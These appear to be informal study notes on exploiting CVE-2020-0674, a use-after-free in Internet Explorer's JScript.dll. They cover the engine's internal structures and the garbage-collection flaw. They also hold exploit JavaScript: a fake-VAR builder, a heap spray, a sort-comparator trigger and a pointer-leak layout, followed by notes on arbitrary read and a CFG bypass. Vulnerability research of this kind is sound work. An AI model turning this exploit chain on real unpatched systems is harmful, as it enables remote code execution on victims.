# CVE-2020-0674 Microsoft Internet Explorer 11 'Jscript.dll' - Use-After-Free

https://github.com/5l1v3r1/CVE-2020-0674/blob/master/docs/index.html

https://labs.withsecure.com/publications/internet-exploiter-understanding-vulnerabilities-in-internet-explorer

https://www.exploit-db.com/exploits/49541

https://www.exploit-db.com/exploits/49062

https://www.exploit-db.com/exploits/49863

How does JScript work? Scanning -> parsing and compilation -> execution

parsing and compilation creates AST and generates P-code (similar to VBA)

var aaa = new Object();
var bbb = aaa;

// Scope setup
Create var aaa
Create var bbb

// var aaa = new Object();
Push address of aaa
Push the value of object Object // (1)
Pop a value and create object of that type. The result is pushed onto the stack // (2)
Pop a value off the stack and pop the variable to assign it to off the stack // (3)

// var bbb = aaa;
Push the address of bbb
Push the value of aaa // (4)
Pop a value off the stack and pop the variable to assign it to off the stack // (5)

After point 1. [aaa, ptr to Object]
After point 2. [aaa, new Object]
After point 3. []
After point 4. [bbb, aaa]
After point 5. []

Structure of variables: 

struct VAR {
int64 type; // The type of this object (Array, Integer, Float, ...) - Although of size short but for alignment, it takes up a full 64-bit value.
void *obj_ptr; // Either points to the object for this variable (for example a C++ object or BSTR) or acts as storage for an inline value.
VAR *next_var_ptr; // Mostly unused and not always a VAR pointer when it is used but acts as so during GC when calling scavenger functions.
};

Structure of objects:

var non_native = {name: 'Non-native'}; not native

var native = new Date(); native

Structure of strings (e.g. variable names):

struct SYM {
wchar_t *symbol; // A pointer to the string that this structure represents.
unsigned int length; // The length of the string in wchar_t's.
int hash; // The hash value for the symbol.
short is_bstr; // Whether symbol is a BSTR or Psz.
int bstr_to_be_freed; // Whether the string has been marked to be freed.
};

association between variable name and the value itself is stored in VVAL

struct VVAL {
VAR variant; // The VAR value that this name relates to (For example, the object that the name refers to).
void *vval_type; // Appears to be 0x8 when the symbol is for a function such as a constructor, or 0x19 when the symbol is for a property such as the String length property.
int hash; // A 32-bit hash value.
unsigned int name_length; // A 32-bit number that says how many wchar_t values are in the name.
VVAL *next; // A pointer to the next VVAL property.
VVAL *next_hashbucket_vval; // If the hash of this object matches another in the namelist, the pointer for this struct replaces the old pointer and the old pointer is instead placed here to act as a singly-linked list.
int id_number; // The index of the property, incremented for each property that is made).
wchar_t name[]; // The wchar_t string.
};

JScript.dll Garbage Collection issue

How does GC work?

traverse through VARS and mark them to be free

see which VARS are currently referenced and unmark them

free marked VARS

In JScript, GC uses series of doubly-linked blocks. each block has storage for 100 VAR structs

struct GcBlock {
GcBlock *forward;
GcBlock *backward;
VAR storage[100];
};

when entire GcBlock is freed, add to list of freeblocks. to do this, ALL VARS must be free

when maybe 50/100, not added to list but deallocated





how to exploit: convert to type confusion

WScript.Echo("Start");
[0, 0].sort(exploit);

function exploit(firstE1, secondE1) {
    WScript.Echo("End");
    return 0;
}

untracked_1 point to Object in an array, which is located in a GcBlock struct, 50 other GcBlocks

untracked_1 now points to freed memory. to control this, we need to allocate memory equal to the GcBlock which is:
8+8+100*24=0x970

create a fake VAR using makeVariant helper function which just creates a 24 byte VAR

we create an array of arrays in overlay

then we create gcblocks by creating an array of objects

point untracked to any one of the gcblock

deference everything and collect garbage

for(var i=0; i < size*2; i++) {
// Type Confusion: Spray VVAL structures. This will malloc with a length of ((2*len(name) + 0x42)*2 + 8). The aim is to allocate the size of GcBlock. This is because untracked_1 points to a var in a GcBlock.
        overlay[i][variants] = 1;
}

need 0x239 for name to result in allocation of 0x970 bytes

0x239 will eventually lead to malloc(0x970)

when chunk is allocated, UTF-16 property name is copied over starting at offset 0x48

0
...
0x48: NAME STARTS HERE

need to align our fake VARS in our 0x239 block so that the untracked_1 will point to any of the fake VARs

0x48-0x8-0x8 = 0x38
0x38 % 0x18 = 0x8 remainder

GcBlock forward Pointer
GcBlock backward Pointer
VAR[100]

0x18 - 0x8 = 0x10
0x10 bytes of padding is required

how many 0x18 structures can we fit inside 0x478

0
...
0x48: AAAA..
0x58: 
0x68: 

0: ptr
0x8: ptr
0x10: var
0x28: var
0x40: var
0x58: var
...




0x239 worth of 0x18 VARs

variant = 0x239

untracked_1 will point to one of the VARS created by variant

idrk get this part but ok

reliability not there cause only 1 untracked pointer

to solve this




function makeVariant(type, obj_ptr_lower, obj_ptr_upper, next_ptr_lower, next_ptr_upper) { // Make a variant
    var charCodes = new Array();
    charCodes.push(
         // type
        type, 0, 0, 0,

         // obj_ptr
        obj_ptr_lower & 0xffff, 
        (obj_ptr_lower >> 16) & 0xffff, 
        obj_ptr_upper & 0xffff, 
        (obj_ptr_upper >> 16) & 0xffff,

        // next_ptr
        next_ptr_lower & 0xffff, 
        (next_ptr_lower >> 16) & 0xffff, 
        next_ptr_upper & 0xffff, 
        (next_ptr_upper >> 16) & 0xffff
        );
    return String.fromCharCode.apply(null, charCodes);
}



// VVAL to link VAR and actual value that the VAR represents
var overlay = new Array();
for(var i=0; i < 20000; i++) {
    overlay[i] = new Array(); // this can be object as well i think
}

var spray = new Array();
for(var i = 0; i < 20000; i++) spray[i] = new Object();

var depth = 0;

function compare(untracked_1, untracked_2) {
    if(depth == 300) {
        for(var i=0; i < 20000; i++) spray[i] = 0;
        CollectGarbage();
        for(var i=0; i < 20000; i++) {
            overlay[i][variants] = 1;
        }
    }
    else {
        untracked_1 = spray[depth*2];
        untracked_2 = spray[depth*2 + 1];
        depth += 1;
        [0,0].sort(compare);
        if(typeof untracked_1 === "number") WScript.Echo(untracked_1);
        if(typeof untracked_2 === "number") WScript.Echo(untracked_2);
    }
    return 4;
}

0x230

((2*len(name) + 0x42)*2 + 8) = 0x96E

0x2


we use 11 As which is 22 bytes

struct VAR {
int64 type; // The type of this object (Array, Integer, Float, ...) - Although of size short but for alignment, it takes up a full 64-bit value.
void *obj_ptr; // Either points to the object for this variable (for example a C++ object or BSTR) or acts as storage for an inline value.
VAR *next_var_ptr; // Mostly unused and not always a VAR pointer when it is used but acts as so during GC when calling scavenger functions.
};

if type = 0x5, then obj_ptr treated as float value and can be read to leak obj_pointer

struct VVAL {
VAR variant; 24 bytes
void *vval_type; 8 bytes

---------------------------------------------------> TYPE
int hash; 4 bytes  
unsigned int name_length; 4 bytes
---------------------------------------------------> TYPE

VVAL *next; // A pointer to the next VVAL property. this one would be treated as obj pointer?
but since this is to be interpreted as a float VAR, then the pointer can be read 
 
VVAL *next_hashbucket_vval; 8?

int id_number; 8?

24 + 8 + 4 + 4 + 8 + 8 + 8?

wchar_t name[]; // The wchar_t string.
};

// Paddding
var variants = "AAAAAAAA";

// Shorter VAR length as not to go past the 0x970
while(variants.length < 0x230) {
// Generate a number of variants with type 3 (int) and the value 1234
    variants += makeVariant(0x0003, 1234, 0x00000000, 0x00000000, 0x00000000);
}

// End the variants block with the value 5
variants += "\u0005";

inject a float VAR at the end of your payload

if one of the untracked variables points to this float, then we can leak the obj_ptr to this polluted float.


0x230 + 0x18


0x239 -> 0x970, how?

we will add related-VVAL structures that can fit, such as other property names :

overlay[i][variants] is a property name

overlay[i][padding] is another property name


The NameList::FCreateVval function uses the NoRelAlloc::PvAlloc function to allocate data. The size that FCreateVval passes to PvAlloc is:

In JScript, a NameList is used to link information such as property names and when a new property is created, it allocates space to store the VVAL structure




if untracked points to hash, hash would be treated as type

Therefore allocating a single-byte property name "\u0005" after this 0x239-character property name is created will cause PvAlloc to return a pointer inside the 0x970-byte block just after the previous property name which is "\u0005" in this context because the original VVAL only took up 0x4fa bytes (VVAL struct + name string), leaving 0x476 bytes of free space remaining in the allocated area.


var leaked_var = "A";


overlay[i][variants] = 1;
overlay[i][padding] = 1; // Required in order to align the untracked variable
overlay[i]["\u0005"] = 1; // The hash-manipulating value. (but is a float)
overlay[i][leaked_var] = 1; //The next property that will get leaked. (cuz this is interpreted as a float)


creates 4 VVAL structures, 

0x239 string uses 0x970 soace cause we include other related VVAL structures, like other propert names for the same object

PvAlloc to return a pointer inside the 0x970-byte block just after the previous property name because the original VVAL (0x239 property name) only took up 0x4fa bytes (VVAL struct + name string), leaving 0x476 bytes of free space remaining in the allocated area.

am kinda lost but ok, i just take it

%u0005 will cause the hash value to be %u0005?

start at 0?

hash = each char + 17 * hash

hash would hence be %u0005

overlay[i][leaked_var] = 1; this is to make sure the VVAL structure created at overlay[i]["\u0005"] = 1; will point to something and we can leak that

how to obtain arbitrary read primative?

create a fake BSTR string VAR object, obj_pointer would be a pointer to the string itslf

use charCodeAt() to read value, if the DWORD prior to address is null, then cannot

use .length to read values instead

create a number of string pointers 

XXXX 0000 0010 0000 0000 0000 0000

XXXX 0000 0010 0
&
0000 0fff ffff f

XXXX 0

CFG bypass

x64 shit

ret address -> RSP https://stackoverflow.com/questions/62183380/where-is-the-return-address-stored-in-x64-ms-fastcall

https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/windows-x64-calling-convention-stack-frame

https://stackoverflow.com/questions/30190132/what-is-the-shadow-space-in-x64-assembly

arg1: rcx

arg2: rdx

arg3: r8

arg4: r9

arg5 onwards: stack

between rsp+0 and rsp+0x20, there is a shadow store 



somehow, when we call typeof, rcx is conveniently a pointer to the area which we control, we can then construct a CONTEXT object and win :)


https://github.com/maxpl0it/CVE-2020-0674-Exploit/blob/master/README.md
https://labs.withsecure.com/publications/internet-exploiter-understanding-vulnerabilities-in-internet-explorer
https://www.exploit-db.com/exploits/49062



https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-0674

https://www.blackhat.com/docs/asia-14/materials/Yason/WP-Asia-14-Yason-Diving-Into-IE10s-Enhanced-Protected-Mode-Sandbox.pdf

https://msrc.microsoft.com/update-guide/en-US/advisory/ADV200001

https://github.com/maxpl0it/CVE-2020-0674-Exploit/blob/master/exploit.html

https://github.com/5l1v3r1/CVE-2020-0674/tree/master

https://www.blackhat.com/docs/us-14/materials/us-14-Yu-Write-Once-Pwn-Anywhere.pdf

https://learn.microsoft.com/en-us/troubleshoot/developer/browsers/administration/enhanced-protected-mode-add-on-compatibility

https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-oaut/3fe7db9f-5803-4dc4-9d14-5425d3f5461f

https://learn.microsoft.com/en-us/windows/win32/api/oaidl/ns-oaidl-variant

JSCRIPT 

https://www.exploit-db.com/exploits/47707

https://www.exploit-db.com/exploits/44404

https://www.exploit-db.com/exploits/43367

https://www.exploit-db.com/exploits/45279

https://www.exploit-db.com/exploits/43131

https://twitter.com/maxpl0it/status/1253396942048104448

https://bugs.chromium.org/p/project-zero/issues/detail?id=1506

https://bugs.chromium.org/p/project-zero/issues/detail?id=1587

https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2019/CVE-2019-1367.html

https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2022/CVE-2022-41128.html

https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2020/CVE-2020-0674.html

https://www.mcafee.com/blogs/other-blogs/mcafee-labs/ie-scripting-flaw-still-a-threat-to-unpatched-systems-analyzing-cve-2018-8653/

https://www.catalog.update.microsoft.com/Search.aspx?q=KB4534251

https://www.catalog.update.microsoft.com/Search.aspx?q=kb4525106

app containers

https://blogs.jpcert.or.jp/en/2016/08/appcontainers-p-d296.html

https://blogs.jpcert.or.jp/en/2015/08/enhanced-protected-mode-in-internet-explorer.html

https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context

http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FThread%2FNtContinue.html

https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2019/CVE-2019-1367.html

https://blog.confiant.com/internet-explorer-cve-2019-1367-exploitation-part-1-7ff08b7dcc8b

https://blog.confiant.com/internet-explorer-cve-2019-1367-exploitation-part-2-8143242b5780

jscript9.dll on windows 10 similar to the one that we created above

https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2020/CVE-2020-1380.html

https://googleprojectzero.blogspot.com/2021/02/deja-vu-lnerability.html
